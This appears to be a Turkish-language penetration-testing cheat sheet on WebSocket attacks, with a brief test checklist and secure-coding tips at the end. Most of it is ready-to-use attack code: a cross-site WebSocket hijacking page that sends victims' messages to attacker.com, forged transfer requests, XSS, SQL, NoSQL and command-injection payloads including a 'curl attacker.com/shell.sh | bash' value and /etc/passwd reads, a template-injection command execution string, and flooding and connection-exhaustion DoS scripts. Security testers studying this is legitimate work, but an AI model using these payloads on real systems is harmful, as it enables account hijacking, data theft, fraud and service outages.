# 🔌 WebSocket Güvenlik Testleri ve Saldırı Kılavuzu

[🇬🇧 English](../WebSocket-Attacks.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 WebSocket Temelleri

### El Sıkışma İsteği (Handshake Request)
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### El Sıkışma Yanıtı (Handshake Response)
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Tespit (Detection)
```
- ws:// (şifrelenmemiş düz metin)
- wss:// (TLS şifreli güvenli bağlantı)
- İstek başlığında Upgrade: websocket
- Tarayıcı Ağ (Network) sekmesinde "101 Switching Protocols" yanıt kodu
```

---

## 🎯 WebSocket Zafiyetleri

### 1. Siteler Arası WebSocket Ele Geçirme (CSWSH - Cross-Site WebSocket Hijacking)

**Zafiyet Şartı:** Sunucu gelen `Origin` başlığını doğrulamıyorsa veya zayıf doğruluyorsa.

```html
<!-- Saldırganın kontrolündeki web sayfası -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Bağlantı kuruldu, saldırgan kurban adına veri isteyebilir
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Kurbanın mesajlarını çal ve saldırgan sunucusuna ilet
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**CSRF Benzeri Eylem Tetikleme:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Kurban adına yetkisiz para transferi veya işlem yapma
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Eksik Origin Doğrulaması

**Test Yöntemleri:**
```bash
# wscat kullanarak
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# websocat kullanarak
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**İstismar:**
```javascript
// Sunucu herhangi bir Origin'i kabul ediyorsa
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Kimlik Doğrulama Zafiyetleri

**Kimlik Doğrulamasız Bağlantı:**
```javascript
// Çerez veya token olmadan bağlanmayı deneme
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Yetki kontrolü yapılmıyor mu?
};
```

**URL İçinde Token Taşınması (Sızıntı Riski):**
```
wss://target.com/ws?token=GIZLI_TOKEN
// Token loglara, Referer başlıklarına ve tarayıcı geçmişine sızabilir
```

**Farklı Kimlik Doğrulama Durumlarını Test Etme:**
```javascript
// Süresi dolmuş token ile test
// Manipüle edilmiş / geçersiz token ile test
// Hiçbir token olmadan test
// Farklı bir kullanıcının token'ı ile test
```

---

### 4. WebSocket Üzerinden Enjeksiyon Saldırıları

**WebSocket Üzerinden XSS:**
```javascript
// XSS payload'ı gönderme
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL Enjeksiyonu:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**İşletim Sistemi Komut Enjeksiyonu:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL Enjeksiyonu:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. DoS (Hizmet Dışı Bırakma) Saldırıları

**Mesaj Yağmuru (Message Flooding):**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Büyük boyutlu mesajlar gönderme
  }, 1);
};
```

**Bağlantı Tüketimi (Connection Exhaustion):**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Bağlantıyı açık tut

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Veri Manipülasyonu ve Yarış Durumları

**Mesaj Değiştirme (Message Tampering):**
```javascript
// Burp Suite WebSocket Proxy ile giden/gelen mesajları yakalama ve değiştirme

// Orijinal mesaj:
{"action": "transfer", "amount": 10, "to": "user123"}

// Değiştirilmiş mesaj:
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Yarış Durumu (Race Conditions):**
```javascript
// Kısa sürede eşzamanlı çok sayıda istek gönderme
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Test Araçları

### Burp Suite
```
1. Proxy → WebSockets history
2. İsteğe sağ tıklayın → Send to Repeater
3. Mesajı düzenleyip tekrar gönderin
4. "Auto-scroll to end" seçeneğini aktif edin
```

### wscat (Komut Satırı İstemcisi)
```bash
# Kurulum
npm install -g wscat

# Bağlanma
wscat -c wss://target.com/ws

# Özel HTTP başlıkları ile
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Sahte Origin başlığı ile
wscat -c wss://target.com/ws -o "https://evil.com"
```

### websocat
```bash
# Kurulum
cargo install websocat

# Bağlanma
websocat wss://target.com/ws

# Başlıklarla birlikte
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Python ile Test Betiği
```python
import websocket
import json

def on_message(ws, message):
    print(f"Alındı: {message}")

def on_open(ws):
    # Test payload'ları
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Tarayıcı Geliştirici Araçları (DevTools)
```javascript
// WebSocket trafiğini izleme: F12 → Ağ (Network) → WS filtresi

// Konsoldan manuel test
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Gelen:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Payload Koleksiyonu

### Kimlik Doğrulama Testleri
```json
// Kimlik doğrulaması olmadan
{"action": "get_secret_data"}

// Boş token
{"token": "", "action": "admin_action"}

// Null token
{"token": null, "action": "delete_user"}
```

### XSS Payload'ları
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### SQLi Payload'ları
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Komut Enjeksiyonu
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Dizin Gezinimi (Path Traversal) & SSTI
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Test Kontrol Listesi (Checklist)

```markdown
□ WebSocket uç noktalarını tespit edin (/ws, /chat, /socket.io vb.)
□ Origin başlığı doğrulamasını test edin (farklı origin kabul ediliyor mu?)
□ CSWSH (Siteler Arası WebSocket Ele Geçirme) açıklarını araştırın
□ Kimlik doğrulama gereksinimlerini kontrol edin
□ Token'ların URL yerine güvenli yollarla iletildiğini doğrulayın
□ Gelen/giden mesajlarda enjeksiyon açıklarını test edin (XSS, SQLi, Komut)
□ Yetkilendirme kontrollerini inceleyin (başka kullanıcıların verileri)
□ İstek ve mesaj sınırlaması (Rate Limiting) var mı kontrol edin
□ Mesaj boyutu limitlerini test edin (DoS riski)
□ Hassas verilerin şifrelenmemiş (ws://) iletilip iletilmediğini kontrol edin
□ Bağlantı kopması ve yeniden bağlanma mekanizmalarını inceleyin
```

---

## 🔐 Güvenli Kodlama Önerileri

```javascript
// Sunucu tarafı Origin doğrulaması
if (request.headers.origin !== 'https://guvenilir-site.com') {
  socket.close(1008, 'Geçersiz origin');
  return;
}

// Token tabanlı güçlü kimlik doğrulama
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Geçersiz token');
  }
});

// Girdi doğrulama ve temizleme
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Geçersiz girdi'}));
    return;
  }
});
```

---

## 🔗 İlgili Kılavuzlar

- [XSS Payload'ları](./XSS.tr.md)
- [SQLi Payload'ları](./SQLi.tr.md)
- [Komut Enjeksiyonu](./Command-Injection.tr.md)

---

**Ana Dizine Dön:** [📖 Genel Kılavuz](../../README.tr.md)
